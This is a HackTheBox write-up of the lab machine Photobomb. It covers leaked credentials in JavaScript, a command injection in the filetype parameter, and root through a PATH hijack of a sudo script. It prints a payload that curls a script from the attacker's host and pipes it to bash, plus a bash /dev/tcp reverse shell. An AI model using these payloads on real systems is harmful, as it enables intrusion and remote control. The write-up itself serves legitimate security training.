[HTB: Photobomb](#)




![](/img/photobomb-cover.png)

Photobomb was on the easy end of HackTheBox weekly machines. I'll find
credentials in a JavaScript file, and use those to get access to an
image manipulation panel. There's a command injection vulnerability in
the panel, which I'll use to get execution and a shell. For privesc, the
user can run a script as root, and there are two ways to get execution
from this. The first is a find command that is called without the full
path. The second is abusing the disabled Bash builtin \[.

## Recon

### nmap

`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

Based on the
[OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server)
versions, the host is likely running Ubuntu 20.04 focal. The web host
redirects to `photobomb.htb`.

### Subdomain Fuzz

Because DNS names are involved here, I'll us ffuf to fuzz for additional
subdomains that may respond differently than the default case. I'll
start with no filter, and see that the default response is an HTTP 302
of size 154:



    oxdf@hacky$ ffuf -u http://10.10.11.182 -H "Host: FUZZ.photobomb.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

I'll ctrl-c to kill `fuff` and restart the same command with `--fs 154`.
It doesn't find anything. I'll add `photobomb.htb` to my `/etc/hosts`
file.

### Website - TCP 80

#### Site

The site is for some kind of photo printing pyramid scheme:

![](/img/image-20230204151116774.png)

Clicking on "click here!" goes to `/printer`, but pops a request for
HTTP basic auth:

![](/img/image-20230204151150993.png)

It does say the creds are in the welcome pack, which I don't have yet.

#### Tech Stack

The HTTP headers don't give much additional information:



    HTTP/1.1 200 OK
    Server: nginx/1.18.0 (Ubuntu)
    Date: Sat, 04 Feb 2023 20:10:36 GMT
    Content-Type: text.md;charset=utf-8
    Connection: close
    X-Xss-Protection: 1; mode=block
    X-Content-Type-Options: nosniff
    X-Frame-Options: SAMEORIGIN
    Content-Length: 843



I am not able to guess the index extension. `index.php` and `index.md`
both return 404, with a custom 404 page:

![](/img/image-20230204151418420.png)

Interestingly, the link on the 404 page points to `localhost:1234`.
Updating it to `photobomb.htb` does fix the image:

![](/img/image-20230204151531775.png)

Peaking a the HTML source for the main page, there's a `photobomb.js`
script loaded:

![](/img/image-20230204151835714.png)

Looking at it, there's a function `init` set to run once the window
loads:



    function init() {
      // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
      if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
        document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');
      }
    }
    window.onload = init;



It's setting the link to include the password, user pH0t0, password
b0Mb!.

#### Directory Brute Force

I'll run `feroxbuster` against the site, but it only identifies printer
pages that I return 401 unauthorized:



    oxdf@hacky$ feroxbuster -u http://photobomb.htb

It could be that those different links all exist, but it seems more
likely that the NGINX rule is looking for anything starting with
`/printer` and checking auth. I can test this by visiting `/printer0xdf`
and seeing that it asks for auth:

![](/img/image-20230204152043334.png)

Since I do have the creds, I can try visiting one of these and entering
them. They work, but lead to the 404 page.

## Shell as www-data

### Authenticated /printer

With the creds from above, `/printer` will load:


[![](/img/image-20230204152622036.png)](/img/image-20230204152622036.png)


[*Click for full
![image*](/img/image-20230204152622036.png)



There's a bunch of images, and at the bottom, an option to download an
image of a selected size:

![](/img/image-20230204152646220.png)

Picking an image and pushing the button submits a POST to `/printer`
with the following body:



    photo=wolfgang-hasselmann-RLEgmd1O7gs-unsplash.jpg&filetype=png&dimensions=1000x1500



### Command Injection

#### Strategy

It seems very likely that the server is not keeping different sizes and
formats of each image on the server, but rather converting one image
using a tool like `convert` (from
[ImageMagick](https://imagemagick.org/index.php)) at the time of the
request.

For example, to resize a JPG image to 1000 by 1000 and convert it to a
PNG, the server could run:



    convert original.jpg -resize 1000x1000 new.png



If that's what the server is doing, then the following is user input
(shown in `[]`):



    convert [photo] -resize [dimensions] new.[filetype]



If any of these aren't sanitized properly, there could be command
injection.

#### POC

As I don't see the output of the command run on the server, it seems
unlikely that I'd be able to see the output of the command injection
either. I'll use a simple `sleep 5` payload to see if the server hangs.

Adding a command injection to the `photo` parameter returns immediately
with a 500 Internal Server Error:

![](/img/image-20230204154242222.png)

Same thing on `dimensions`:

![](/img/image-20230204154157976.png)

However, on `filetype`, it takes over 6 seconds before returning 500:

![](/img/image-20230204154118135.png)

#### Shell

To convert this into a shell, I'll have it run `curl` to my webserver
and get a `bash` script that will run a reverse shell:



    filetype=png;curl+10.10.14.6/shell.sh|bash



I'll host a simple [bash reverse
shell](https://www.youtube.com/watch?v=OjkVep2EIlw) as `shell.sh`:



    #!/bin/bash

    bash -i >& /dev/tcp/10.10.14.6/443 0>&1



I'll run a Python webserver to host it.

When I send that request (using Burp Repeater), there's a connection at
my webserver:



    10.10.11.182 - - [04/Feb/2023 20:44:39] "GET /shell.sh HTTP/1.1" 200 -



And then a connection at my listening `nc`:



    oxdf@hacky$ nc -lnvp 443
    Listening on 0.0.0.0 443
    Connection received on 10.10.11.182 42718
    bash: cannot set terminal process group (735): Inappropriate ioctl for device
    bash: no job control in this shell
    wizard@photobomb:~/photobomb$ 



I'll do a [shell upgrade](https://www.youtube.com/watch?v=DqE6DxqJg8Q)
with the `script` / `stty` trick:



    wizard@photobomb:~/photobomb$ script /dev/null -c bash
    script /dev/null -c bash
    Script started, file is /dev/null
    wizard@photobomb:~/photobomb$ ^Z
    [1]+  Stopped                 nc -lnvp 443
    oxdf@hacky$ stty raw -echo; fg
    nc -lnvp 443
                reset
    reset: unknown terminal type unknown
    Terminal type? screen
    wizard@photobomb:~/photobomb$



And grab `user.txt`:



    wizard@photobomb:~$ cat user.txt
    c3afcfa5************************



## Shell as root

### Enumeration

#### sudo

The first thing I'll check for privileges escalation on Linux is
`sudo -l` to list commands that the current user can run as another
user:



    wizard@photobomb:~$ sudo -l
    Matching Defaults entries for wizard on photobomb:
        env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

    User wizard may run the following commands on photobomb:
        (root) SETENV: NOPASSWD: /opt/cleanup.sh  



A few takeaways here:

-   wizard can run `/opt/cleanup.sh` as root.
-   `SETENV` means that the current environment will be used rather than
    a fresh one.

#### /opt/cleanup.sh

The `cleanup.sh` script looks to be managing log files for the web
application:



    #!/bin/bash
    . /opt/.bashrc
    cd /home/wizard/photobomb

    # clean up log files
    if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
    then
      /bin/cat log/photobomb.log > log/photobomb.log.old
      /usr/bin/truncate -s0 log/photobomb.log
    fi

    # protect the priceless originals
    find source_images -type f -name '*.jpg' -exec chown root:root {} \; 



At the top, the first time is sourcing the local `.bashrc` file. This
would be used to set the environment as desired. Then it changes into
the `photobomb` directory.

`[ -s log/photobomb.log ]` checks if that log file exists and has size
greater than 0, and `! [ -L logs/photobomb.log ]` makes sure it's not a
symbolic link. If both are true, it moves the contents of the log file
into `log/photobomb.log.old` and then calls `truncate` on the log to set
it's size to 0.

Finally, there's a `find` command that will change all images in this
directory and subdirectories to be owned by root.

#### .bashrc

Typically `.bashrc` files are found in home directories (and there's one
system-wide one in `/etc`), but there's no reason there can't be one
here. I'll run `cat .bashrc | grep -v "^#" | grep .` to get only the
non-commented and non-blank lines. First, it adds `/snap/bin/` to the
PATH:



    PATH=${PATH/:\/snap\/bin/}



The next line is interesting:



    enable -n [ # ]



It may be tempting to view this as the `#` between two square brackets,
but it's actually calling `enable -n [` and the rest is a comment. I'll
come back to this below.

There are some more commands in here, but nothing super interesting:



    enable -n [ # ]
    [ -z "$PS1" ] && return
    shopt -s checkwinsize
    if [ -z "${debian_chroot:-}" ] && [ -r /etc/debian_chroot ]; then
        debian_chroot=$(cat /etc/debian_chroot)
    fi
    if ! [ -n "${SUDO_USER}" -a -n "${SUDO_PS1}" ]; then
      PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '
    fi
    if [ ! -e "$HOME/.sudo_as_admin_successful" ] && [ ! -e "$HOME/.hushlogin" ] ; then
        case " $(groups) " in *\ admin\ *|*\ sudo\ *)
        if [ -x /usr/bin/sudo ]; then
            cat <<-EOF
            To run a command as administrator (user "root"), use "sudo <command>".
            See "man sudo_root" for details.

            EOF
        fi
        esac
    fi
    if [ -x /usr/lib/command-not-found -o -x /usr/share/command-not-found/command-not-found ]; then
            function command_not_found_handle {
                    # check because c-n-f could've been removed in the meantime
                    if [ -x /usr/lib/command-not-found ]; then
                       /usr/lib/command-not-found -- "$1"
                       return $?
                    elif [ -x /usr/share/command-not-found/command-not-found ]; then
                       /usr/share/command-not-found/command-not-found -- "$1"
                       return $?
                    else
                       printf "%s: command not found\n" "$1" >&2
                       return 127
                    fi
            }
    fi



### Path Hijack

#### Easy Path

There's a very simple path hijack in the script. I'll notice that all
the binaries called are referenced with full path except for that last
`find`:



    # protect the priceless originals
    find source_images -type f -name '*.jpg' -exec chown root:root {} \;



That means that `bash` will search the directories specified in the
`$PATH` environment variable looking for a binary named `find`.
Typically, it'll find `find` in `/usr/bin/find`.

But that's where the `SETENV` becomes useful to me.

I'll create a script called `find` in a temp space like `/dev/shm` and
set it as executable:



    wizard@photobomb:/dev/shm$ echo -e '#!/bin/bash\n\nbash'        
    #!/bin/bash

    bash
    wizard@photobomb:/dev/shm$ echo -e '#!/bin/bash\n\nbash' > find
    wizard@photobomb:/dev/shm$ chmod +x find



Running this `find` just starts a new `bash` instance as the current
user.

Now I'll run `cleanup.sh` as root but with the `PATH` variable including
the current directory at the front of the path:



    wizard@photobomb:/dev/shm$ sudo PATH=$PWD:$PATH /opt/cleanup.sh 
    root@photobomb:/home/wizard/photobomb#



It returns a root shell. And I can read `root.txt`:



    root@photobomb:~# cat root.txt
    bbfa4b76************************



#### Intended Path

I'm not sure where the `find` without the full path got added in, but
the original submission required a bit more knowledge of Bash, and the
builtin `[`. One of the mistakes I would also make when trying to use
the syntax `[ -s /some/file ]` would be not including a space after the
`[`. When you think of `[` in the same category as `{` or `(` in a
programming language, then the space doesn't make sense. But in Bash,
`[` is actually the same as `test`, and a program on the filesystem
([this
article](https://www.educative.io/courses/master-the-bash-shell/392YWp2pOv4)
shows more detail).

This is clean on Photobomb:



    wizard@photobomb:/dev/shm$ which [
    /usr/bin/[
    wizard@photobomb:/dev/shm$ file /usr/bin/[ 
    /usr/bin/[: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=99cfd563b4850f124ca01f64a15ec24fd8277732, for GNU/Linux 3.2.0, stripped



In a typical shell, the binary isn't called, as it's a [Bash
builtin](https://manpages.ubuntu.com/manpages/bionic/man7/bash-builtins.7.md).
So even with no `$PATH`, it can still be called (like `echo`):



    wizard@photobomb:/dev/shm$ export PATH=''
    wizard@photobomb:/opt$ [ -s cleanup.sh ] && echo "exists"
    exists



But, `enable -n [` disables it (see the [bash man
page](https://linux.die.net/man/1/bash)). That means that I can do the
same trick above, but with `[`:



    wizard@photobomb:/dev/shm$ rm find
    wizard@photobomb:/dev/shm$ echo -e '#!/bin/bash\n\nbash' > [
    wizard@photobomb:/dev/shm$ chmod +x [
    wizard@photobomb:/dev/shm$ sudo PATH=$PWD:$PATH /opt/cleanup.sh
    root@photobomb:/dev/shm#
